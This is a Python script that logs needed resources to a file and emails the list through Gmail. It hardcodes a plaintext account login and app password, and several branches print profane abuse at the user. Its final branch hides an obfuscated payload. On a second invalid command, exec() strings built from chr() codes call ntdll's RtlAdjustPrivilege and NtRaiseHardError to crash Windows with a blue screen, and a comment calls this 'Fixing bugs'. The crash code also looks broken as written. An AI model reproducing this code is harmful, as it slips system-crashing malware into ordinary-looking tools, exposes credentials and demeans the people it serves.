import time as t
import smtplib as s
import os

commands = {"log": "}l",
            "email list": "}e",  # List of commands with their meanings and symbols
            "calculator": "}c",
            "stop": "}s",
            "help": "}h",
            }

pressurepoint = 0

f = open("list.txt", "w")  # check if there is a file called 'list.txt'
f.close()  # closes the document for security

switch = True
while switch == True:

    # extract the commands from the input
    extract = input("\nInput commands here('}h' for help): ")

    # separates the commands in the extract with a space (" ")
    extraction = extract.split(" ")

    if len(extraction) >= 1:
        command1 = extraction[0]  # if there is only one command put in

    if len(extraction) >= 2:
        command2 = extraction[1]  # if there is more than one command put in

    if len(extraction) >= 3:
        command3 = extraction[2]  # if there is more than two commands put in

    # if the first command is equal to that of the 'log' command
    if command1 == commands["log"]:

        if len(extraction) > 2:

            # defining the resource variable as equal to that of the second extracted command
            resource = command2
            # defining the amount variable as equal to that of the third extracted command
            amount = command3

            # opening the 'list.txt' file in order to append
            f = open("list.txt", "a")
            # appending the two extracted values to the file
            f.write(f"\n{resource.lower()}: {amount}")
            f.close()  # saving the file

        else:
            print("\nRTFM")

    # if the first command is equal to that of the 'email list' command
    elif command1 == commands["email list"]:

        if len(extraction) >= 2:

            # defining the email1 variable as equal to that of the second extracted command
            email1 = command2
            # defining the email2 variable as equal to that of the third extracted command if there is more than two extractions

            if len(extraction) == 3:
                extra_note = command3

            # opening the 'list.txt' file in order to read from the file
            f = open("list.txt", "r")

            server = s.SMTP('smtp.gmail.com', 587)  # connecting to the server
            server.ehlo()  # checking if the server is there
            server.starttls()  # starting the connection
            server.ehlo()  # sealing the connection

            # logging into the server with the email and it's corresponding automation password
            server.login('bluerhino.bot@gmail.com', 'npyqucqlzchqvgjd')

            subject = 'List of needed resources'  # defining the subject of the email
            body = ""
            for line in f.readlines():  # defining the body by iunserting every line of the 'list.txt' file

                body = body + f"\n{line}"

            if len(extraction) == 3:
                body = body + f"\n\n{extra_note}"

            # compiling the overall message to be sent to the emails provided
            msg = f"Subject: {subject}\n\n{body}"

            # sending the email to the email1 address
            server.sendmail('bluerhino.bot@gmail.com', email1, msg)
            # sending the email to the email2 address if there is more than one email)

            # alerting the user that the email has been sent
            print('\nEmail has been sent.')

            server.quit()  # cancelling the connection

        else:
            print("\nRTFM")

    # Insulting the user for having high expectations
    elif command1 == commands["calculator"]:

        try:
            print("\nGo fuck yourself.")
            t.sleep(1)
            print("Use the built in one.")
            t.sleep(1)
            print("'Code your own calculator in', the fuck I will.")
            print("Connais ta place.")
            t.sleep(1)
            print("Bitch.")
        except:
            print("\nRTFM")

    # printing out all of the commands and their meanings
    elif command1 == commands["help"]:
        try:
            for key, symbol in commands.items():  # looping through the dictionary
                # printing the keys and the symbols in a formatted response
                print(f"\n{key} = {symbol}")
        except:
            print("\nRTFM")

    # stopping the program
    elif command1 == commands["stop"]:
        try:
            switch = False  # switching the switch variable to false
        except:
            print("\nRTFM")

    else:

        if pressurepoint == 1:  # Checking if the pressurpoint varibale is equal to one

            # Making the abuse of the user more delightful
            print("\nSupreme Senpai Admin: You have fucked up for the last time.")
            t.sleep(1)
            print("\nSupreme Senpai Admin: I choose you Duolingo!")
            t.sleep(1)
            print("\nDuolingo: Bonjour.")
            t.sleep(1)
            print("\nDuolingo: You know what happens now...")

            # Attacking the kernal in order for it to cause a BlueScreen. Side note: Thanks Dylan

            import ctypes as atf  # Fixing bugs
            from ctypes.wintypes import *

            t1 = atf.c_bool()
            t2 = atf.c_uint()

            i = 110
            k1 = "a"
            exec('kl += \'c\'\nkl = atf.WinDLL(\''+chr(i) +
                 chr(i+6)+chr(i-10)+chr(i-2)+chr(i-2)+'.dll\') ')
            exec(
                'gf = kl.NtRaiseHardError\nlf = atf.c_int\nba = atf.c_uint\nbl = atf.c_bool\nkl.RtlAdjustPrivilege.argtypes = [lf, bl, bl, ctypes.POINTER(atf.c_bool)]\nexec(\'gf.argtypes = [ba, ba, ba, ba, ba, ctypes.POINTER(ba)]\')')
            exec('kl.RtlAdjustPrivilege(19, True, False, atf.byref(t1))\ngf(0xC0000420, 0, 0, 0, 6, atf.byref(t2))')

            ###################################################################################################
        else:

            print("ENTER FUCKING '}h' FOR HELP")
            t.sleep(1)                            # Abuse the user
            print("DONT FUCK UP NEXT TIME.")

            pressurepoint = 1  # Set the pressure point to 1, in order to force shutdown if there is another incorrect answer
